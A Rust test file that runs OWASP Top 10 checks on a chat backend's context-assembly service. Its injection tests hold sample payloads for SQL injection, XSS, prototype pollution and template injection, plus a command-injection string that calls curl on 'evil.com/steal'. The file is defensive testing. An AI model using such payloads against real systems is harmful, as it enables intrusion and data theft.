use scribe_backend::{
    services::{
        hierarchical_context_assembler::HierarchicalContextAssembler,
        intent_detection_service::IntentDetectionService,
        query_strategy_planner::QueryStrategyPlanner,
        agentic::entity_resolution_tool::EntityResolutionTool,
        EncryptionService,
        context_assembly_engine::{PlotSignificance, WorldImpactLevel},
    },
    models::characters::CharacterMetadata,
    test_helpers::{MockAiClient, spawn_app_with_options},
};
use std::sync::Arc;
use uuid::Uuid;
use secrecy::SecretBox;
use chrono::Utc;

/// OWASP Top 10 Security Tests for Hierarchical Context Assembler

/// Helper to create a test character with encrypted fields
fn create_test_character_with_encrypted_data() -> CharacterMetadata {
    // Create fake encrypted data that's at least 16 bytes (for the GCM auth tag)
    let fake_encrypted_data = vec![0u8; 32]; // 32 bytes of fake encrypted data
    
    CharacterMetadata {
        id: Uuid::new_v4(),
        user_id: Uuid::new_v4(),
        name: "Test Character".to_string(),
        description: Some(fake_encrypted_data.clone()),
        description_nonce: Some(vec![0; 12]),
        personality: Some(fake_encrypted_data.clone()),
        personality_nonce: Some(vec![0; 12]),
        scenario: Some(fake_encrypted_data.clone()),
        scenario_nonce: Some(vec![0; 12]),
        mes_example: Some(fake_encrypted_data.clone()),
        mes_example_nonce: Some(vec![0; 12]),
        creator_comment: None,
        creator_comment_nonce: None,
        first_mes: None,
        created_at: Utc::now(),
        updated_at: Utc::now(),
    }
}

/// Helper to create a mock HierarchicalContextAssembler
async fn create_mock_assembler(ai_response: String) -> HierarchicalContextAssembler {
    // Create standard responses for the multiple AI calls
    let intent_response = r#"{
        "intent_type": "NarrativeGeneration",
        "focus_entities": [{"name": "Test", "entity_type": "CHARACTER", "priority": 1.0, "required": true}],
        "time_scope": {"type": "Current"},
        "spatial_scope": null,
        "reasoning_depth": "Deep",
        "context_priorities": ["Entities"],
        "confidence": 0.9
    }"#.to_string();
    
    let tactical_response = r#"{
        "steps": [{
            "description": "Process user input",
            "preconditions": [],
            "expected_outcomes": ["Response generated"],
            "required_entities": [],
            "estimated_duration": 1000
        }],
        "overall_risk": "Low",
        "mitigation_strategies": []
    }"#.to_string();
    
    let entity_response = r#"{
        "entities": [],
        "relationships": [],
        "reasoning": "No entities found in query"
    }"#.to_string();
    
    // Create responses array with intent, strategic (user-provided), tactical, and entity responses
    let responses = vec![intent_response, ai_response, tactical_response, entity_response];
    let mock_ai_client = Arc::new(MockAiClient::new_with_multiple_responses(responses));
    
    let mock_intent_service = Arc::new(IntentDetectionService::new(mock_ai_client.clone()));
    let mock_planner = Arc::new(QueryStrategyPlanner::new(mock_ai_client.clone()));
    
    // Create a mock entity resolution tool
    let test_app = spawn_app_with_options(false, false, false, false).await;
    let db_pool = Arc::new(test_app.db_pool.clone());
    
    // Create AppState for EntityResolutionTool
    let app_state = test_app.app_state.clone();
    let mock_entity_tool = Arc::new(EntityResolutionTool::new(app_state));
    
    let encryption_service = Arc::new(EncryptionService);
    
    HierarchicalContextAssembler::new(
        mock_ai_client,
        mock_intent_service,
        mock_planner,
        mock_entity_tool,
        encryption_service,
        db_pool,
    )
}

#[tokio::test]
async fn test_a01_broken_access_control_no_cross_user_context_leakage() {
    // A01: Broken Access Control
    // Ensure the service doesn't leak context from other users' characters
    
    let ai_response = r#"{
        "directive_type": "Character Development",
        "narrative_arc": "Personal Growth",
        "plot_significance": "Major",
        "emotional_tone": "Reflective",
        "character_focus": ["Test Character", "Another_User_Character"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    let assembler = create_mock_assembler(ai_response).await;
    
    let user_id = Uuid::new_v4();
    let character = create_test_character_with_encrypted_data();
    let chat_history = vec![];
    
    // Even if AI returns references to other users' characters, 
    // the assembler should process them as data, not grant access
    let result = assembler.assemble_enriched_context(
        "Tell me about my character's relationships",
        &chat_history,
        Some(&character),
        user_id,
        None, // No DEK provided
    ).await;
    
    assert!(result.is_ok());
    let context = result.unwrap();
    
    // The strategic directive should contain the character focus
    if let Some(directive) = context.strategic_directive {
        assert_eq!(directive.character_focus.len(), 2);
        // Note: Access control for actual character data happens at higher layers
    }
}

#[tokio::test]
async fn test_a02_cryptographic_failures_proper_dek_handling() {
    // A02: Cryptographic Failures
    // Ensure DEK is used properly for decryption and not exposed
    
    let ai_response = r#"{
        "directive_type": "Character Development",
        "narrative_arc": "Personal Growth",
        "plot_significance": "Major",
        "emotional_tone": "Reflective",
        "character_focus": ["Test Character"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    let assembler = create_mock_assembler(ai_response).await;
    
    let user_id = Uuid::new_v4();
    let character = create_test_character_with_encrypted_data();
    let chat_history = vec![];
    
    // Create a mock DEK
    let dek_bytes = vec![0u8; 32]; // 32 bytes for AES-256
    let user_dek = Arc::new(SecretBox::new(Box::new(dek_bytes.clone())));
    
    // Test with DEK - should attempt decryption
    let result = assembler.assemble_enriched_context(
        "Describe my character",
        &chat_history,
        Some(&character),
        user_id,
        Some(&user_dek),
    ).await;
    
    // Since we're using fake encrypted data with a fake DEK, decryption will fail
    // This is expected - the test is checking that the DEK isn't exposed in errors
    assert!(result.is_err());
    let error_msg = result.unwrap_err().to_string();
    
    // Verify no DEK data appears in the error message
    assert!(!error_msg.contains("SecretBox"));
    assert!(!error_msg.contains(&format!("{:?}", dek_bytes)));
    
    // Also verify error is generic enough
    assert!(error_msg.contains("DecryptionError") || error_msg.contains("Failed to decrypt"));
}

#[tokio::test]
async fn test_a02_cryptographic_failures_no_dek_graceful_degradation() {
    // A02: Cryptographic Failures
    // Ensure service works without DEK (graceful degradation)
    
    let ai_response = r#"{
        "directive_type": "General Interaction",
        "narrative_arc": "Ongoing Story",
        "plot_significance": "Minor",
        "emotional_tone": "Neutral",
        "character_focus": ["Test Character"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    let assembler = create_mock_assembler(ai_response).await;
    
    let user_id = Uuid::new_v4();
    let character = create_test_character_with_encrypted_data();
    let chat_history = vec![];
    
    // Test without DEK - should work with limited context
    let result = assembler.assemble_enriched_context(
        "Hello",
        &chat_history,
        Some(&character),
        user_id,
        None, // No DEK
    ).await;
    
    assert!(result.is_ok());
    let context = result.unwrap();
    
    // Should have basic character info but no decrypted fields
    assert!(context.relevant_entities.len() > 0);
    let character_entity = &context.relevant_entities[0];
    assert!(character_entity.entity_name == "Test Character");
    
    // AI insights should indicate limited context
    assert!(character_entity.ai_insights.iter()
        .any(|insight| insight.contains("Limited character context") || 
                      insight.contains("encrypted data not accessible")));
}

#[tokio::test]
async fn test_a03_injection_malicious_ai_response_handling() {
    // A03: Injection
    // Test handling of malicious AI responses
    
    let malicious_responses = vec![
        // SQL injection attempt in AI response
        r#"{
            "directive_type": "'; DROP TABLE users; --",
            "narrative_arc": "Destruction",
            "plot_significance": "Major",
            "emotional_tone": "Malicious",
            "character_focus": ["Test"],
            "world_impact_level": "Global"
        }"#,
        
        // JavaScript injection attempt
        r#"{
            "directive_type": "<script>alert('xss')</script>",
            "narrative_arc": "XSS Attack",
            "plot_significance": "Major",
            "emotional_tone": "Evil",
            "character_focus": ["<img src=x onerror=alert(1)>"],
            "world_impact_level": "Personal"
        }"#,
        
        // Prototype pollution attempt
        r#"{
            "directive_type": "Normal",
            "narrative_arc": "Story",
            "plot_significance": "Major",
            "emotional_tone": "Neutral",
            "character_focus": ["Test"],
            "world_impact_level": "Personal",
            "__proto__": {"isAdmin": true},
            "constructor": {"prototype": {"isAdmin": true}}
        }"#,
    ];
    
    for malicious_response in malicious_responses {
        let assembler = create_mock_assembler(malicious_response.to_string()).await;
        
        let user_id = Uuid::new_v4();
        let chat_history = vec![];
        
        let result = assembler.assemble_enriched_context(
            "Test query",
            &chat_history,
            None,
            user_id,
            None,
        ).await;
        
        // Should either handle gracefully or fail safely
        match result {
            Ok(context) => {
                // If successful, malicious content should be treated as data
                if let Some(directive) = context.strategic_directive {
                    // The directive type is just a string, not executed
                    assert!(directive.directive_type.len() > 0);
                }
            }
            Err(_) => {
                // Failing is also acceptable for malformed input
            }
        }
    }
}

#[tokio::test]
async fn test_a03_injection_malicious_user_input() {
    // A03: Injection
    // Test handling of malicious user input
    
    let user_id = Uuid::new_v4();
    let chat_history = vec![];
    
    let malicious_inputs = vec![
        "'; DROP TABLE characters; --",
        "<script>alert('xss')</script>",
        "{{ 7*7 }}", // Template injection
        "${7*7}", // Expression injection
        "$(curl evil.com/steal)", // Command injection
    ];
    
    for malicious_input in malicious_inputs {
        // Create a fresh assembler for each test to ensure we have responses
        let ai_response = r#"{
            "directive_type": "General Interaction",
            "narrative_arc": "Ongoing Story",
            "plot_significance": "Minor",
            "emotional_tone": "Neutral",
            "character_focus": ["User"],
            "world_impact_level": "Personal"
        }"#.to_string();
        
        let assembler = create_mock_assembler(ai_response).await;
        
        let result = assembler.assemble_enriched_context(
            malicious_input,
            &chat_history,
            None,
            user_id,
            None,
        ).await;
        
        // Should process as normal text, not execute
        assert!(result.is_ok());
        let context = result.unwrap();
        
        // The malicious input should be in sub-goal description as text
        assert!(context.current_sub_goal.context_requirements.len() > 0);
    }
}

#[tokio::test]
async fn test_a04_insecure_design_strategic_directive_validation() {
    // A04: Insecure Design
    // Ensure the service validates strategic directive fields
    
    let invalid_responses = vec![
        // Invalid plot significance
        r#"{
            "directive_type": "Test",
            "narrative_arc": "Story",
            "plot_significance": "INVALID_SIGNIFICANCE",
            "emotional_tone": "Neutral",
            "character_focus": ["Test"],
            "world_impact_level": "Personal"
        }"#,
        
        // Invalid world impact level
        r#"{
            "directive_type": "Test",
            "narrative_arc": "Story",
            "plot_significance": "Major",
            "emotional_tone": "Neutral",  
            "character_focus": ["Test"],
            "world_impact_level": "UNIVERSE_ENDING"
        }"#,
    ];
    
    for invalid_response in invalid_responses {
        let assembler = create_mock_assembler(invalid_response.to_string()).await;
        
        let user_id = Uuid::new_v4();
        let chat_history = vec![];
        
        let result = assembler.assemble_enriched_context(
            "Test",
            &chat_history,
            None,
            user_id,
            None,
        ).await;
        
        assert!(result.is_ok());
        let context = result.unwrap();
        
        if let Some(directive) = context.strategic_directive {
            // Should fall back to valid defaults
            assert!(matches!(
                directive.plot_significance,
                PlotSignificance::Major | PlotSignificance::Moderate | 
                PlotSignificance::Minor | PlotSignificance::Trivial
            ));
            
            assert!(matches!(
                directive.world_impact_level,
                WorldImpactLevel::Global | WorldImpactLevel::Regional |
                WorldImpactLevel::Local | WorldImpactLevel::Personal
            ));
        }
    }
}

#[tokio::test]
async fn test_a05_security_misconfiguration_no_sensitive_error_details() {
    // A05: Security Misconfiguration
    // Ensure error messages don't leak sensitive information
    
    let assembler = create_mock_assembler("INVALID JSON {{{".to_string()).await;
    
    let user_id = Uuid::new_v4();
    let chat_history = vec![];
    
    let result = assembler.assemble_enriched_context(
        "Test",
        &chat_history,
        None,
        user_id,
        None,
    ).await;
    
    assert!(result.is_err());
    let error_msg = result.unwrap_err().to_string();
    
    // Error should be generic, not expose internal details
    assert!(error_msg.contains("Failed to parse") || error_msg.contains("TextProcessingError"));
    
    // Should not contain:
    // - File paths
    assert!(!error_msg.contains("/home/"));
    assert!(!error_msg.contains("\\src\\"));
    // - Stack traces (note: JSON parsing errors with "at line X" are acceptable)
    assert!(!error_msg.contains("stack backtrace"));
    // - Internal structure details
    assert!(!error_msg.contains("HierarchicalContextAssembler"));
}

#[tokio::test]
async fn test_a08_data_integrity_confidence_score_bounds() {
    // A08: Software and Data Integrity Failures
    // Ensure confidence scores are properly bounded
    
    let ai_response = r#"{
        "directive_type": "Test",
        "narrative_arc": "Story",
        "plot_significance": "Major",
        "emotional_tone": "Neutral",
        "character_focus": ["Test"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    let assembler = create_mock_assembler(ai_response).await;
    
    let user_id = Uuid::new_v4();
    let chat_history = vec![];
    
    let result = assembler.assemble_enriched_context(
        "Test",
        &chat_history,
        None,
        user_id,
        None,
    ).await;
    
    assert!(result.is_ok());
    let context = result.unwrap();
    
    // Confidence score should be bounded
    assert!(context.confidence_score >= 0.0);
    assert!(context.confidence_score <= 1.0);
    
    // Default for bridge implementation should be 0.75
    assert_eq!(context.confidence_score, 0.75);
}

#[tokio::test]
async fn test_a08_data_integrity_numeric_overflow_protection() {
    // A08: Data Integrity - Numeric overflow protection
    
    let overflow_response = r#"{
        "directive_type": "Test",
        "narrative_arc": "Story",
        "plot_significance": "Major",
        "emotional_tone": "Neutral",
        "character_focus": ["Test"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    // Also test the tactical plan response with large numbers
    let plan_response = r#"{
        "steps": [{
            "description": "Test step",
            "preconditions": [],
            "expected_outcomes": [],
            "required_entities": [],
            "estimated_duration": 9999999999999
        }],
        "overall_risk": "Low",
        "mitigation_strategies": []
    }"#.to_string();
    
    // Create standard intent response
    let intent_response = r#"{
        "intent_type": "NarrativeGeneration",
        "focus_entities": [],
        "time_scope": {"type": "Current"},
        "spatial_scope": null,
        "reasoning_depth": "Deep",
        "context_priorities": ["Entities"],
        "confidence": 0.9
    }"#.to_string();
    
    // Entity response
    let entity_response = r#"{
        "entities": [],
        "relationships": [],
        "reasoning": "No entities found"
    }"#.to_string();
    
    // Create responses array
    let responses = vec![intent_response, overflow_response, plan_response, entity_response];
    let mock_ai_client = Arc::new(MockAiClient::new_with_multiple_responses(responses));
    
    let mock_intent_service = Arc::new(IntentDetectionService::new(mock_ai_client.clone()));
    let mock_planner = Arc::new(QueryStrategyPlanner::new(mock_ai_client.clone()));
    
    let test_app = spawn_app_with_options(false, false, false, false).await;
    let db_pool = Arc::new(test_app.db_pool.clone());
    
    // Create AppState for EntityResolutionTool
    let app_state = test_app.app_state.clone();
    let mock_entity_tool = Arc::new(EntityResolutionTool::new(app_state));
    
    let encryption_service = Arc::new(EncryptionService);
    
    let assembler = HierarchicalContextAssembler::new(
        mock_ai_client,
        mock_intent_service,
        mock_planner,
        mock_entity_tool,
        encryption_service,
        db_pool,
    );
    
    let user_id = Uuid::new_v4();
    let chat_history = vec![];
    
    let result = assembler.assemble_enriched_context(
        "Test",
        &chat_history,
        None,
        user_id,
        None,
    ).await;
    
    // Should handle large numbers gracefully
    assert!(result.is_ok());
    let context = result.unwrap();
    
    // Execution time should be reasonable
    assert!(context.execution_time_ms < 1_000_000); // Less than 1000 seconds
    
    // Token counts should be reasonable
    assert!(context.total_tokens_used < 1_000_000);
}

#[tokio::test]
async fn test_a09_logging_no_sensitive_data_in_context() {
    // A09: Security Logging and Monitoring Failures
    // Ensure sensitive data isn't included in the context that might be logged
    
    let ai_response = r#"{
        "directive_type": "Character Analysis",
        "narrative_arc": "Personal Story",
        "plot_significance": "Major",
        "emotional_tone": "Intimate",
        "character_focus": ["Test Character"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    let assembler = create_mock_assembler(ai_response).await;
    
    let user_id = Uuid::new_v4();
    let mut character = create_test_character_with_encrypted_data();
    
    // Create fake encrypted data that looks like it contains sensitive info
    // but is actually just random bytes (since real encryption would encrypt it)
    character.description = Some(vec![1u8; 64]); // Fake encrypted "SSN: 123-45-6789"
    character.personality = Some(vec![2u8; 64]); // Fake encrypted "Password: secret123!"
    
    let chat_history = vec![];
    let dek_bytes = vec![0u8; 32];
    let user_dek = Arc::new(SecretBox::new(Box::new(dek_bytes)));
    
    let result = assembler.assemble_enriched_context(
        "Analyze my character",
        &chat_history,
        Some(&character),
        user_id,
        Some(&user_dek),
    ).await;
    
    // Since we're using fake encrypted data, decryption will fail
    // For this test, create a new assembler to check without DEK
    let ai_response2 = r#"{
        "directive_type": "Character Analysis",
        "narrative_arc": "Personal Story",
        "plot_significance": "Major",
        "emotional_tone": "Intimate",
        "character_focus": ["Test Character"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    let assembler2 = create_mock_assembler(ai_response2).await;
    
    let result_no_dek = assembler2.assemble_enriched_context(
        "Analyze my character",
        &chat_history,
        Some(&character),
        user_id,
        None, // No DEK
    ).await;
    
    assert!(result_no_dek.is_ok());
    let context = result_no_dek.unwrap();
    
    // Convert context to string to simulate logging
    let context_string = format!("{:?}", context);
    
    // Should not contain sensitive patterns
    assert!(!context_string.contains("123-45-6789"));
    assert!(!context_string.contains("secret123!"));
    assert!(!context_string.contains("SSN:"));
    assert!(!context_string.contains("Password:"));
    
    // Should not contain raw encryption keys
    assert!(!context_string.contains("[0, 0, 0, 0"));
}

#[tokio::test]
async fn test_encryption_error_handling_invalid_nonce() {
    // Test handling of invalid nonce data
    
    let ai_response = r#"{
        "directive_type": "Test",
        "narrative_arc": "Story",
        "plot_significance": "Major",
        "emotional_tone": "Neutral",
        "character_focus": ["Test Character"],
        "world_impact_level": "Personal"
    }"#.to_string();
    
    let assembler = create_mock_assembler(ai_response).await;
    
    let user_id = Uuid::new_v4();
    let mut character = create_test_character_with_encrypted_data();
    
    // Set invalid nonce (wrong length)
    character.description_nonce = Some(vec![0; 5]); // Should be 12 bytes
    
    let chat_history = vec![];
    let dek_bytes = vec![0u8; 32];
    let user_dek = Arc::new(SecretBox::new(Box::new(dek_bytes)));
    
    let result = assembler.assemble_enriched_context(
        "Test",
        &chat_history,
        Some(&character),
        user_id,
        Some(&user_dek),
    ).await;
    
    // Should fail with decryption error
    assert!(result.is_err());
    let error_msg = result.unwrap_err().to_string();
    assert!(error_msg.contains("DecryptionError") || error_msg.contains("Failed to decrypt"));
}

#[tokio::test]
async fn test_large_character_array_handling() {
    // Test handling of large character focus arrays
    
    let mut character_list = Vec::new();
    for i in 0..100 {
        character_list.push(format!(r#""Character_{}""#, i));
    }
    
    let ai_response = format!(r#"{{
        "directive_type": "Ensemble Cast",
        "narrative_arc": "Epic Saga",
        "plot_significance": "Major",
        "emotional_tone": "Complex",
        "character_focus": [{}],
        "world_impact_level": "Global"
    }}"#, character_list.join(","));
    
    let assembler = create_mock_assembler(ai_response).await;
    
    let user_id = Uuid::new_v4();
    let chat_history = vec![];
    
    let result = assembler.assemble_enriched_context(
        "Tell me about all characters",
        &chat_history,
        None,
        user_id,
        None,
    ).await;
    
    assert!(result.is_ok());
    let context = result.unwrap();
    
    if let Some(directive) = context.strategic_directive {
        // Should handle large arrays without issues
        assert_eq!(directive.character_focus.len(), 100);
    }
}